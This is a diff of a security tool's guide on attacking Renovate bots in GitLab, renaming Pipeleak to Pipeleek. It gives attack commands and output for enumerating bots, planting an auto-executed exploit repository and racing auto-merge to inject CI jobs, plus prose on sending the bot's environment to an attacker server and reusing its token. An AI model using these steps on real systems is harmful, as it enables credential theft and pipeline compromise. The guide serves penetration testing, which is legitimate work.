@@ -10,11 +10,12 @@ keywords:
 
 # Attacking Renovate Bots: A Practical Guide
 
-This guide explains how to use Pipeleak to discover and exploit common misconfigurations in Renovate bot setups. For more background and technical details, see the full [blog post](https://blog.compass-security.com/2025/05/renovate-keeping-your-updates-secure/).
+This guide explains how to use Pipeleek to discover and exploit common misconfigurations in Renovate bot setups. For more background and technical details, see the full [blog post](https://blog.compass-security.com/2025/05/renovate-keeping-your-updates-secure/).
 
 There are two key points to understand:
 
 1. **Code Execution by Renovated Repositories**
+
    > Every project renovated by the same bot must be considered equally trusted and exposed to the same attack level. If one project is compromised, all others processed by that bot can be affected. Code execution by the renovated repository in the bot context is assumed in Renovate's threat model.
 
 2. **GitLab Invite Auto-Acceptance**
@@ -31,7 +32,7 @@ Use the `enum` command to scan your GitLab instance for Renovate bot jobs and co
 For example, we enumerated Renovate configs found on GitLab.com. One project was found that enables Renovate's autodiscovery of projects and does **not** set any autodiscovery filters.
 
 ```bash
-pipeleak gl renovate enum -g https://gitlab.com -t glpat-[redacted] --dump
+pipeleek gl renovate enum -g https://gitlab.com -t glpat-[redacted] --dump
 2025-09-30T07:11:06Z info Fetching projects
 2025-09-30T07:11:12Z warn Identified Renovate (bot) configuration autodiscoveryFilterType= autodiscoveryFilterValue= hasAutodiscovery=true hasAutodiscoveryFilters=false hasConfigFile=true pipelines=enabled selfHostedConfigFile=true url=https://gitlab.com/test-group/renovate-bot
 2025-09-30T07:11:16Z info Fetched all projects
@@ -51,8 +52,8 @@ The Renovate bot from the example above is configured to autodiscover new projec
 The following command creates a repository that includes an exploit script called `exploit.sh`. Whenever a Renovate bot picks up this repo, the script will be executed.
 
 ```bash
-pipeleak gl renovate autodiscovery -g https://gitlab.com -t glpat-[redacted] -v
-2025-09-30T07:19:33Z info Created project name=devfe-pipeleak-renovate-autodiscovery-poc url=https://gitlab.com/myuser/devfe-pipeleak-renovate-autodiscovery-poc
+pipeleek gl renovate autodiscovery -g https://gitlab.com -t glpat-[redacted] -v
+2025-09-30T07:19:33Z info Created project name=devfe-pipeleek-renovate-autodiscovery-poc url=https://gitlab.com/myuser/devfe-pipeleek-renovate-autodiscovery-poc
 2025-09-30T07:19:35Z debug Created file fileName=renovate.json
 2025-09-30T07:19:35Z debug Created file fileName=build.gradle
 2025-09-30T07:19:36Z debug Created file fileName=gradlew
@@ -105,7 +106,7 @@ Such a merge request can look like this. Below the title, you see the bot's user
 
 Invite that user to your repository with `developer` access. Now, wait until the bot is triggered next. After it has run, you can find the environment file on your GoShs server.
 
-In that file, extract all sensitive environment variables and use them for lateral movement. Most interesting is probably the `RENOVATE_TOKEN`, as it might contain a GitLab PAT. You can then enumerate the access of that PAT using Pipeleak's features.
+In that file, extract all sensitive environment variables and use them for lateral movement. Most interesting is probably the `RENOVATE_TOKEN`, as it might contain a GitLab PAT. You can then enumerate the access of that PAT using Pipeleek's features.
 
 > After receiving a merge request from the Renovate bot, you must fully delete both the branch and the merge request. This ensures the bot will recreate them, allowing your script to run again. Otherwise, the script will not be executed a second time. Ensure to revert the commits as well if they were merged.
 
@@ -117,10 +118,10 @@ Fortunately, the project is using Renovate and the bot is configured to auto-mer
 
 Your goal is to abuse the Renovate bot's access level to merge a malicious `gitlab-ci.yml` file into the main branch, effectively bypassing a review by other project maintainers. On the main branch, you can then steal the exposed environment variables used for deployments.
 
-Using Pipeleak, you can monitor your repository for new Renovate branches. When a new one is detected, Pipeleak tries to add a new job into the `gitlab-ci.yml`. As this needs to exploit a race condition (adding new changes to the Renovate branch before the bot activates auto-merge), this might take a few attempts.
+Using Pipeleek, you can monitor your repository for new Renovate branches. When a new one is detected, Pipeleek tries to add a new job into the `gitlab-ci.yml`. As this needs to exploit a race condition (adding new changes to the Renovate branch before the bot activates auto-merge), this might take a few attempts.
 
 ```bash
-pipeleak gl renovate privesc -g https://gitlab.com -t glpat-[redacted] --repo-name company1/a-software-project --renovate-branches-regex 'renovate/.*' -v
+pipeleek gl renovate privesc -g https://gitlab.com -t glpat-[redacted] --repo-name company1/a-software-project --renovate-branches-regex 'renovate/.*' -v
 2025-09-30T07:56:57Z debug Verbose log output enabled
 2025-09-30T07:56:57Z info Ensure the Renovate bot does have a greater access level than you, otherwise this will not work, and is able to auto merge into the protected main branch
 2025-09-30T07:56:58Z debug Testing push access level for default branch branch=main requiredAccessLevel=40 userAccessLevel=30
